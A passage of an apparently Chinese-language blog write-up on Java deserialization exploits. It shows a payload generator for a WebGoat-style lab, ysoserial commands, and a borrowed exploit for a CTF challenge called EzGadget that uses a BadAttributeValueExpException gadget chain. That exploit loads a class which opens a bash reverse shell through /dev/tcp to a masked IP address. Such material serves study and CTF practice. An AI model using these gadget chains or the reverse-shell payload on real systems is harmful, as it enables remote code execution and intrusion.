                <span class="n">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">taskAction</span><span class="o">);</span>
                <span class="n">BufferedReader</span> <span class="n">in</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span>
                        <span class="k">new</span> <span class="n">InputStreamReader</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
                <span class="n">String</span> <span class="n">line</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
                <span class="k">while</span> <span class="o">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">in</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">line</span><span class="o">);</span>
                <span class="o">}</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
<span class="c1">//Main.java</span>
<span class="kn">package</span> <span class="nn">org.dummy.insecure.framework</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
<span class="c1">// import org.dummy.insecure.framework.VulnerableTaskHolder;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Main</span> <span class="o">{</span>
    <span class="kd">static</span> <span class="kd">public</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">VulnerableTaskHolder</span> <span class="n">go</span> <span class="o">=</span> <span class="k">new</span> <span class="n">VulnerableTaskHolder</span><span class="o">(</span><span class="s">"sleep"</span><span class="o">,</span> <span class="s">"sleep 5"</span><span class="o">);</span>
            <span class="n">ByteArrayOutputStream</span> <span class="n">bos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
            <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">bos</span><span class="o">);</span>
            <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">go</span><span class="o">);</span>
            <span class="n">oos</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">exploit</span> <span class="o">=</span> <span class="n">bos</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();</span>
            <span class="n">String</span> <span class="n">exp</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">exploit</span><span class="o">);</span>
            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">exp</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>

        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211106185628.png"/></p>
<blockquote>
<p>注意编译时的Java版本问题，这个目前不是很清楚。</p>
</blockquote>
<p>运行得出payload。<br/>
还可以直接拿shell，利用bash反弹shell<br/>
生成payload使用工具<code>ysoserial.jar</code>，这里使用修改版的。</p>
<div class="highlight"><pre><span></span>java -jar ysoserial.jar
</pre></div>
<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211106190503.png"/><br/>
利用选1，寻找可用payload选2</p>
<div class="highlight"><pre><span></span>java -Dhibernate5 -cp hibernate-core-5.4.28.Final.jar<span class="p">;</span>ysoserial.jar ysoserial.GeneratePayload Hibernate1 <span class="s2">"calc.exe"</span> &gt; m0re.bin
</pre></div>
<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211106190851.png"/><br/>
生成的bin文件，进行base64编码。</p>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python3</span>
<span class="c1"># -*- coding:utf-8 -*-</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="nb">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"m0re.bin"</span><span class="p">,</span><span class="s2">"rb"</span><span class="p">)</span>
<span class="n">access</span> <span class="o">=</span> <span class="nb">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">access</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="nb">file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</pre></div>
<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211106191224.png"/><br/>
版本可能不匹配。<br/>
也有运行<code>mvn clean package -DskipTests</code>重新编译<code>ysoserial.jar</code>的。可以参考这个<a href="https://www.jianshu.com/p/b309a4573abd" target="_blank">地址</a><br/>
还没有了解，先mark了。后续再看。这个关卡就先pass了。还有题目看呢，编译问题就不涉及太多内容了。</p>
<h3 data-content="1" id="be8d1e49f003b86f687f3100d4044501">EzGadget</h3>
<p>因为比赛的时候不会写，Java反序列化一脸懵，所以才来钻研了Java反序列化的基础和简单利用。<br/>
直接反编译，审计</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">String</span> <span class="nf">unser</span><span class="o">(</span><span class="nd">@RequestParam</span><span class="o">(</span><span class="n">name</span><span class="o">=</span><span class="s">"data"</span><span class="o">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">true</span><span class="o">)</span> <span class="n">String</span> <span class="n">data</span><span class="o">,</span> <span class="n">Model</span> <span class="n">model</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">b</span> <span class="o">=</span> <span class="n">Tools</span><span class="o">.</span><span class="na">base64Decode</span><span class="o">(</span><span class="n">data</span><span class="o">);</span>
    <span class="n">InputStream</span> <span class="n">inputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">b</span><span class="o">);</span>
    <span class="n">ObjectInputStream</span> <span class="n">objectInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="n">inputStream</span><span class="o">);</span>
    <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">objectInputStream</span><span class="o">.</span><span class="na">readUTF</span><span class="o">();</span>
    <span class="kt">int</span> <span class="n">year</span> <span class="o">=</span> <span class="n">objectInputStream</span><span class="o">.</span><span class="na">readInt</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">((</span><span class="n">name</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"gadgets"</span><span class="o">))</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">year</span> <span class="o">==</span> <span class="mi">2021</span><span class="o">))</span> <span class="o">{</span>
        <span class="n">objectInputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
    <span class="o">}</span>
</pre></div>
<p>这是反序列化的点。<br/>
其中反序列化前还需要加个验证。</p>
<div class="highlight"><pre><span></span><span class="n">oos</span><span class="o">.</span><span class="na">writeUTF</span><span class="o">(</span><span class="s">"gadgets"</span><span class="o">);</span>
<span class="n">oos</span><span class="o">.</span><span class="na">writeInt</span><span class="o">(</span><span class="mi">2021</span><span class="o">);</span>
</pre></div>
<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211106195935.png"/><br/>
<code>toString()</code>函数加载字节码，cc链还没有看，准备下次学习一下java自带的一些类，然后再进行深入了解cc链。</p>
<p>引用大佬的exp</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">com.ezgame.ctf.tools.ToStringBean</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">ezgame.ctf.bean.User</span><span class="o">;</span>


<span class="kn">import</span> <span class="nn">javax.management.BadAttributeValueExpException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">exp</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">InputStream</span> <span class="n">inputStream</span> <span class="o">=</span> <span class="n">evil</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getResourceAsStream</span><span class="o">(</span><span class="s">"evil.class"</span><span class="o">);</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">inputStream</span><span class="o">.</span><span class="na">available</span><span class="o">()];</span>
        <span class="n">inputStream</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">bytes</span><span class="o">);</span>

        <span class="n">ToStringBean</span> <span class="n">sie</span> <span class="o">=</span><span class="k">new</span> <span class="n">ToStringBean</span><span class="o">();</span>
        <span class="n">Field</span> <span class="n">bytecodes</span> <span class="o">=</span> <span class="n">Reflections</span><span class="o">.</span><span class="na">getField</span><span class="o">(</span><span class="n">sie</span><span class="o">.</span><span class="na">getClass</span><span class="o">(),</span><span class="s">"ClassByte"</span><span class="o">);</span>
        <span class="n">Reflections</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="n">bytecodes</span><span class="o">);</span>
        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">sie</span><span class="o">,</span><span class="s">"ClassByte"</span><span class="o">,</span><span class="n">bytes</span><span class="o">);</span>

        <span class="n">BadAttributeValueExpException</span> <span class="n">exception</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="o">(</span><span class="s">"exp"</span><span class="o">);</span>
        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">exception</span><span class="o">,</span><span class="s">"val"</span><span class="o">,</span><span class="n">sie</span><span class="o">);</span>
                <span class="n">String</span> <span class="n">a</span><span class="o">=</span><span class="n">Serialize</span><span class="o">.</span><span class="na">serialize</span><span class="o">(</span><span class="n">exception</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="n">a</span><span class="o">);</span>

    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>加载的话，可以使用反弹shell的。</p>
<div class="highlight"><pre><span></span><span class="c1">//evil.jaba</span>
<span class="kn">package</span> <span class="nn">com.ezgame.ctf.exp</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">evil</span> <span class="o">{</span>
    <span class="kd">static</span> <span class="o">{</span>
        <span class="k">try</span><span class="o">{</span>
        <span class="n">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span>
        <span class="n">String</span> <span class="n">cmd</span><span class="o">[]=</span> <span class="o">{</span><span class="s">"/bin/bash"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="s">"exec 5&lt;&gt;/dev/tcp/xxx.xxx.xx.xxx/1234;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span><span class="o">};</span>
        <span class="n">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
        <span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">){</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<h2 data-content="1" id="16574350ce3f7a680f60f93d892bcb39">总结</h2>
<p>感觉Java的知识不是很好掌握，可能是我太菜了，玩不动Java，没有常用Java，所以理解起来有点难，知识点还是一点一点啃吧。</p>
<h2 data-content="1" id="e0cb413604c56bb19d4a9f808c83b908">参考链接</h2>
<p><a href="https://www.cnblogs.com/sijidou/p/13121305.html" target="_blank">https://www.cnblogs.com/sijidou/p/13121305.html</a><br/>
<a href="https://blog.csdn.net/qq_43266093/article/details/120883767" target="_blank">https://blog.csdn.net/qq_43266093/article/details/120883767</a><br/>
<a href="https://blog.csdn.net/qq_36241198/article/details/118618001" target="_blank">https://blog.csdn.net/qq_36241198/article/details/118618001</a><br/>
<a href="http://dreamphp.cn/blog/detail?blog_id=31726" target="_blank">http://dreamphp.cn/blog/detail?blog_id=31726</a><br/>
<a href="https://blog.csdn.net/qq_36241198/article/details/118618001" target="_blank">https://blog.csdn.net/qq_36241198/article/details/118618001</a></p>
</div>
</div>